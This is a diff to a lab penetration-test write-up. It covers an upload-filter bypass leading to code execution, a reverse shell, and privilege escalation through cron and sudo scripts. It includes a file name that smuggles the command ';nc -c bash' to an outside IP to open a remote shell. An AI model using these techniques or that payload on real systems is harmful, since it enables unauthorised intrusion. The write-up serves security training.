@@ -70,9 +70,9 @@ When enumerating the HTTP service, a "backup" directory was identified that has 
 ![Directory Listing](https://github.com/Alta-Cupula/Offensive/blob/main/imagem2.png)
 
 After unzipping the file we can read the source codes:
-![Source code - upload](path/uploadphp.jpg)
-![Source code - lib](path/libphp1.jpg)
-![Source code - lib](path/libphp2.jpg)
+![Source code - upload](https://github.com/Alta-Cupula/Offensive/blob/main/uploadphp.png)
+![Source code - lib](https://github.com/Alta-Cupula/Offensive/blob/main/libphp1.png)
+![Source code - lib](https://github.com/Alta-Cupula/Offensive/blob/main/libphp2.png)
 
 Analyzing the code, we can see that it checks if the file size is smaller than 60,000, checks if a file is actually being uploaded and checks if the file extension matches any of those in a predefined list. For that it uses the "getnameUpload" function, which exists in the "lib.php" file that is imported for use in the upload form.
 This "getnameUpload" function creates a variable called "pieces" and splits the filename into parts, the "name" variable takes these pieces and replaces "." by "_" and the variable "ext" takes the last part after the "." to check the extension.
@@ -87,14 +87,14 @@ Part 2 = png
 The variable "name" still has the value "gabriel", it tries to replace all the "." by "_" but as it doesn't have any value, it's still "gabriel", but this time the variable "ext" will have "php.png" as its value.
 We can also see a function called "check_file_type" that is checking the magic bytes of the file being uploaded, which means that just changing the extension in this case would not work, as the file must actually have the magic byte of a png or another file listed in the array earlier.
 
-![Bless](path/bless.jpg)
+![Bless](https://github.com/Alta-Cupula/Offensive/blob/main/bless.png)
 
 After creating a PHP shell with the characteristics that we have already identified as being necessary, we get an RCE in the application.
-![Uploading](path/requisicao.jpg)
-![RCE](path/rce.jpg)
+![Uploading](https://github.com/Alta-Cupula/Offensive/blob/main/requisicao.png)
+![RCE](https://github.com/Alta-Cupula/Offensive/blob/main/rce.png)
 
 Using python we got the reverse shell.
-![Reverse](path/reverse.jpg)
+![Reverse](https://github.com/Alta-Cupula/Offensive/blob/main/reverse.png)
 
 
 **Vulnerability Explanation: In this case, there were several vulnerabilities that led to the initial compromisement of the target, such as information disclosure due directory listing and unrestricted file upload.**
@@ -110,26 +110,26 @@ Ways to fix unrestricted file upload issue:
 **Severity: Critical**
 
 **user.txt Proof Screenshot**
-![Guly](path/gulyflag.jpg)
+![Guly](https://github.com/Alta-Cupula/Offensive/blob/main/gulyflag.png)
 
 
 #### Privilege Escalation
 
 When accessing the user directory "guly" we do not have permission to read the file "user.txt", however reading the file "crontab.guly" we can see that there is a configuration that executes the file "/home/guly/check_attack. php" every 3 minutes.
-![Crontab](path/crontab.jpg)
+![Crontab](https://github.com/Alta-Cupula/Offensive/blob/main/crontab.png)
 
 So when reading the file check_attacks.php we can see a variable "$path" that has the static value defined as "/var/www/html/uploads", however the variable "value" is created receiving the input of "files".
 The variable "files" is using PHP's "scandir" function passing the value "." meaning it wants to list all files and directories in THIS directory. Which means that if we create a file putting malicious content in the name PHP will probably try to execute it.
 So, creating a file called ";nc -c bash 192.168.57.4 9999;" we can get a reverse shell as guly because in line code would be: "exec("nohup /bin/rm -f /var/www/html/uploads;nc -c bash 192.168.57.4 9999; > /dev/null 2>&1 &")"
 ![Malicious file](https://github.com/Alta-Cupula/Offensive/blob/main/arquivomalicioso.png)
-![Reverse as guly](path/reverseasguly.jpg)
-![Guly](path/gulyflag.jpg)
+![Reverse as guly](https://github.com/Alta-Cupula/Offensive/blob/main/reverseasguly.png)
+![Guly]([path/gulyflag.jpg](https://github.com/Alta-Cupula/Offensive/blob/main/gulyflag.png))
 
 After being as guly we run the command "sudo -l" and notice that there is a script that we have permission to run as root.
-![SUID file](path/suid.jpg)
+![SUID file](https://github.com/Alta-Cupula/Offensive/blob/main/suid.png)
 
 The script contains some variables with static content but others that are received by user input, and when it comes to network script where the variable format is "test=gabriel", then if we add a space after the term "gabriel" and we write, that term will be executed.
-![Privesc](path/privesc.jpg)
+![Privesc](https://github.com/Alta-Cupula/Offensive/blob/main/privesc.png)
 
 *Additional Priv Esc info*
 
@@ -142,4 +142,4 @@ The script contains some variables with static content but others that are recei
 **Severity: Critical**
 
 **Proof Screenshot Here:**
-![Privesc](path/privesc.jpg)
+![Privesc](https://github.com/Alta-Cupula/Offensive/blob/main/privesc.png)
